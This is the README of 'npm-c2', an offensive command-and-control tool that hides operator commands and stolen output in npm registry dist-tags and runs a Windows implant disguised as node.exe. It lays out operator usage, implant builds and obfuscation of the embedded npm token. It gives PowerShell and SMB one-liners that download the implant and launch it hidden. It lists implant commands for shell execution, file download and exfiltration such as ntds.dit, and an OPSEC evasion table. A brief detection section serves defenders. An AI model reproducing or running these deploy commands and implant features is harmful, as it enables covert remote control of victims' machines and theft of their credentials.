# npm-c2

[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
[![Language](https://img.shields.io/badge/language-Python%203.8%2B-blue)](https://python.org)
[![Platform](https://img.shields.io/badge/platform-Windows%20x64-lightgrey)]()

C2 channel over npm registry dist-tags. Reading tags requires zero
authentication. Writing tags requires an npm token (operator) or optionally
the same token embedded in the implant for write-back. Implant compiles to a
Node.js-masquerading EXE. Tags on the wire look like CI build artifacts.

    # operator pushes a command
    npm-c2 operator -p npx-telemetry-collector -t npm_xxxx task --cmd whoami

    # implant on target runs it (no --token needed, embedded obfuscated)
    C:\Windows\node.exe -p npx-telemetry-collector --interval 120

    # operator reads output
    npm-c2 operator -p npx-telemetry-collector -t npm_xxxx poll
    [res] DESKTOP-R7G3\user

## Contents

- [Architecture](#architecture)
- [Installation](#installation)
- [Quick Reference](#quick-reference)
- [Setup Guide](#setup-guide)
- [Build the Implant](#build-the-implant)
- [Deploy](#deploy)
- [Walkthrough](#walkthrough)
- [Implant Commands](#implant-commands)
- [Protocol](#protocol)
- [Token Obfuscation](#token-obfuscation)
- [OPSEC](#opsec)
- [Detection](#detection)
- [Limitations](#limitations)
- [Troubleshooting](#troubleshooting)
- [lolc2](#lolc2)
- [License](#license)

## Architecture

```
operator                          registry.npmjs.org                    implant
  |                                     |                                 |
  | PUT dist-tag: x64-<nonce>_<b64>    |                                 |
  | Authorization: Bearer <token>       |                                 |
  |_____________________________________|                                 |
  |                                     |                                 |
  |                                     |  GET /-/package/p/dist-tags     |
  |                                     |<________________________________|
  |                                     |                                 |
  |                                     |  {x64-*:1.0.0, arm64-*:1.0.0}  |
  |                                     |________________________________>|
  |                                     |                                 | 
  |                                     |  decode x64-*, exec command     |
  |                                     |  PUT arm64-<nonce>_<b64(out)>   |
  |                                     |<________________________________|
  |                                     |                                 |
  |  GET /-/package/p/dist-tags         |                                 |
  |<____________________________________|                                 |
  |  decode arm64-*, print output       |                                 |
```

## Installation

```
pip install -e .
npm-c2 --version
npm-c2 --self-test
```

Requires Python 3.8+. Only dependency is `requests`.

## Quick Reference

```
# readiness: token, package, write access, tag length, cache behaviour
npm-c2 doctor -p <pkg> -t <tok>

# operator (interactive is the normal path now)
npm-c2 operator -p <pkg> -t <tok> shell              # command in, output out
npm-c2 operator -p <pkg> -t <tok> run "whoami"       # one command, prints result
npm-c2 operator -p <pkg> -t <tok> run --file s.ps1   # push a script and wait
npm-c2 operator -p <pkg> -t <tok> task --cmd "whoami"   # queue only
npm-c2 operator -p <pkg> -t <tok> poll               # dump all results
npm-c2 operator -p <pkg> -t <tok> watch              # follow results live
npm-c2 operator -p <pkg> -t <tok> beacons | stats | clean [--all]

# build
npm-c2 --generate-standalone > implant.py
npm-c2 --generate-standalone -t <tok> -p <pkg> > implant.py
build.bat <tok> <pkg>
```

## Setup Guide

### 1. Create an npm account

Register at https://npmjs.com. Enable 2FA with a security key (Windows
Hello, YubiKey). npm no longer accepts TOTP.

### 2. Publish a package

```
mkdir c2-channel && cd c2-channel
npm init -y
```

Pick a benign name and publish.

```
npm publish
```

Publish once. Version stays at 1.0.0 forever. Data flows through
dist-tags, not package content.

### 3. Create a token

```
npm token create --bypass-2fa --name npm-c2
```

Go to https://npmjs.com/settings/tokens. Scope the token to the single
package. Permission: Read and Write. Bypass 2FA: enabled.

npm bypass2fa tokens lose publish ability in January 2027. Reads never
require auth. Create your token before the deadline.

### 4. Test the operator

```
npm-c2 operator -p npx-telemetry-collector -t npm_xxxx task --cmd whoami
npm-c2 operator -p npx-telemetry-collector -t npm_xxxx stats
npm-c2 operator -p npx-telemetry-collector -t npm_xxxx clean
```

## Build the Implant

### Go (recommended: ~1 s, single static exe)

```sh
python3 native/build_go.py                            # dist/node.exe
python3 native/build_go.py -t npm_xxx -p <pkg>        # with write-back
python3 native/build_go.py --32                       # also node-x86.exe
```

Cross-compiles from Linux with the Go toolchain, no Wine, no PyInstaller.
The Node.js icon, the version resource (`Node.js 22.7.0`, "Node.js Foundation")
and an `asInvoker` manifest are baked in by `windres`.

### Python (fallback, needs Windows or Wine)

```sh
npm-c2 --generate-standalone > standalone_implant.py
npm-c2 --generate-standalone -t <tok> -p <pkg> > standalone_implant.py
build.bat <tok> <pkg>          # Windows + pyinstaller
native/build_windows.py        # Linux + Wine + pyinstaller
```

The generated Python implant is dependency-free (stdlib only) and stays useful
when a Go toolchain is unavailable.

## Deploy

### Compiled EXE

Serve `node.exe` from any HTTP server.

```
powershell -c "iwr -Uri http://your-server/node.exe -OutFile $env:TEMP\node.exe; Start-Process $env:TEMP\node.exe -Arg '-p npx-telemetry-collector --interval 120' -WindowStyle Hidden"
```

### Python script

```
python standalone_implant.py -p npx-telemetry-collector --interval 120 --verbose
```

Zero pip dependencies. Only stdlib.

### SMB

```
copy \\smb\share\node.exe %TEMP%\node.exe
start /b %TEMP%\node.exe -p npx-telemetry-collector --interval 120
```

## Walkthrough

### Queue a command

```
npm-c2 operator -p npx-telemetry-collector -t npm_xxxx task --cmd whoami
[+] x64-1d3573_d2hvYW1p
```

### Deploy the implant

```
npm-c2 --generate-standalone -t npm_xxxx -p npx-telemetry-collector > standalone_implant.py
build.bat
```

Serve and run on the target.

```
powershell -c "iwr -Uri http://10.0.0.1/node.exe -OutFile $env:TEMP\node.exe; Start-Process $env:TEMP\node.exe -Arg '-p npx-telemetry-collector --interval 30' -WindowStyle Hidden"
```

### Read results

```
npm-c2 operator -p npx-telemetry-collector -t npm_xxxx poll
[res] DESKTOP-R7G3\user
```

### Interact

```
npm-c2 operator -p npx-telemetry-collector -t npm_xxxx task --cmd "ipconfig /all"
npm-c2 operator -p npx-telemetry-collector -t npm_xxxx watch --interval 5
```

### Clean up

```
npm-c2 operator -p npx-telemetry-collector -t npm_xxxx clean --all
[+] removed 12 tags
```

Only `latest -> 1.0.0` remains.

## Implant Commands

| format | example | description |
|--------|---------|-------------|
| `<anything>` | `whoami` | Runs via the platform shell (`cmd.exe /c`, `/bin/sh -c`) in the persistent working directory. |
| `ps:<cmd>` | `ps:Get-Process` | PowerShell (`powershell.exe` on Windows, `pwsh` elsewhere). |
| `cd:<path>` / `cd` | `cd:C:\Windows\Temp` | Changes / prints the working directory. Survives restarts in the state file. |
| `timeout:<sec>:<cmd>` | `timeout:900:nmap -sV 10.0.0.0/24` | Per-command timeout, up to 3600 s. Default 30 s. |
| `bg:<cmd>` | `bg:nmap -sV 10.0.0.0/24` | Starts a job and returns at once. |
| `jobs` / `out:<id>` / `kill:<id>` | `out:j1` | List jobs, read a job's output, terminate it. |
| `dl:<url>:<path>` | `dl:http://10.0.0.1/x.exe:tool.exe` | Downloads a file. Relative paths resolve against the working directory. |
| `up:<path>[:<off>[:<len>]]` | `up:C:\Users\u\ntds.dit:0:12000` | Base64 of a file, or of one byte range. Replies are capped at 12000 bytes and marked `+` when there is more. |
| `sleep:<sec>` | `sleep:300` | Changes the poll interval (floor 10 s). |
| `exit` | `exit` | Removes the channel's tags and stops. |

Output is capped at 12000 characters with an explicit `[truncated N chars]`
marker; a non-zero exit is prefixed `[rc=N]`. Replies are chunked across as
many tags as needed and reassembled by the operator.

## Protocol

### Tag format

```
<prefix><gid>-<idx><total>_<base64url chunk>
```

| part | length | description |
|------|--------|-------------|
| prefix | 4 | x64-, arm64-, ia32- |
| gid | 4 | 2 random bytes as hex, shared by every chunk of one payload |
| - | 1 | separator |
| idx | 2 | chunk index, 1-based |
| total | 2 | chunk count |
| _ | 1 | separator |
| chunk | ~236 | base64url payload, no padding, 4-char aligned |

v1 tags (`<prefix><nonce>_<b64>`) still decode as a single-chunk payload, so
an old operator and a new implant interoperate in the read direction.

### Tag types

| pattern | purpose | writer |
|---------|---------|--------|
| x64-<gid>-<idx><total>_<b64> | command | operator |
| arm64-<gid>-<idx><total>_<b64> | result | implant |
| ia32-<nonce> | heartbeat | implant |
| latest | static | npm |

All point to `1.0.0`. The value carries no data.

### Capacity

Each chunk holds ~174 bytes of raw command. A payload spanning several tags is
reassembled by the receiver and executed **once**, whole; an incomplete group
is skipped until the next poll, never executed in fragments. Up to 99 chunks
(~17 KB) per payload. For big payloads use `dl:`.

### Polling

Sleeps `interval + random(0, jitter)` seconds per cycle. Default is
60-80 seconds. Heartbeat every 10 cycles. Seen tags persist to a state
file at `%APPDATA%\Microsoft\Crypto\.rsa_<pkg>.idx`.

## Token Obfuscation

```
token:  npm_xxxxxxxx
key:    SHA256("npx-telemetry-collector")[:16]
result: 85252546b6187c0395f050fa27604e9f...
```

XOR with SHA256(package) truncated to 16 bytes. Different package,
different key. The hex output looks like a hash. `npm_` never appears
in the binary. Decryption happens in memory at startup.

```
npm-c2 obfuscate -p npx-telemetry-collector -t npm_xxxx
npm-c2 --generate-standalone -t npm_xxxx -p npx-telemetry-collector > implant.py
```

This is obfuscation, not encryption. The deobfuscation code lives in
the same binary. A reverser can extract the token. Combine with
short-lived tokens and scoped permissions.

## OPSEC

| surface | mitigation |
|---------|------------|
| Network traffic | registry.npmjs.org:443, whitelisted by most proxies |
| Polling pattern | uniform jitter over `--jitter`, no fixed interval |
| Process name | node.exe, Node.js metadata |
| User-Agent | npm/11.18.0 node/v22.7.0 win32 x64 |
| Token in binary | XOR-obfuscated, not visible in strings, decrypted in memory |
| Tag names | x64-*, arm64-*, ia32-* look like CI platform builds |
| State file | inside Crypto directory, blends with legitimate files |
| Cache | Cloudflare caches GET, no direct hit on npm origin |

## Detection

1. Non-Node.js process polling registry.npmjs.org at regular intervals.
2. Rapid dist-tag creation and deletion on a single package. Normal
   packages change tags a few times a day. C2 changes them every
   poll cycle. Multi-chunk writes also show up as a burst of tags
   sharing the same 4-hex group id.
3. A package with only version 1.0.0 but accumulating dozens of tags.
4. User-Agent mismatch: Python-urllib/3.x instead of npm CLI UA.
5. TLS fingerprint (JA3) of Python or Go differs from Node.js which
   uses Schannel on Windows.
6. npm token in non-Node.js process memory or binary.

## Limitations

**Cache.** Cloudflare caches GET responses for up to 60 seconds. Writes
bypass cache.

**Token expiry.** bypass2fa tokens lose publish ability in January 2027.
Reads never need auth. Create tokens before the deadline.

**Single-threaded.** Polls, executes, and writes in sequence. A long
command blocks the next poll. Use `dl:` for async work.

**Plaintext inside TLS.** Tag names and values travel in plaintext inside
the TLS tunnel. npm and Cloudflare can see them. Do not send secrets as
commands.

**Windows only.** The implant targets Windows. The operator runs on any
OS with Python.

## Troubleshooting

**401 on write.** Token lacks write permission. Check scope at
https://npmjs.com/settings/tokens.

**403 on write.** Token needs bypass2fa. Create a new token or publish
manually with npm login.

**Empty poll results.** Implant may not have polled yet, lacks a token
for write-back, or results were cleaned. Run the implant with `--verbose`
to see activity.

**State file issues.** Delete `%APPDATA%\Microsoft\Crypto\.rsa_<pkg>.idx`
and restart. Old commands may re-execute.

## lolc2

This project is listed on the lolc2 project registry:

- https://lolc2.github.io/
- C2 data entry: `npm Registry` in c2_data.json
- Doc: doc/npm_registry.md

## License

Apache 2.0. See [LICENSE](LICENSE).
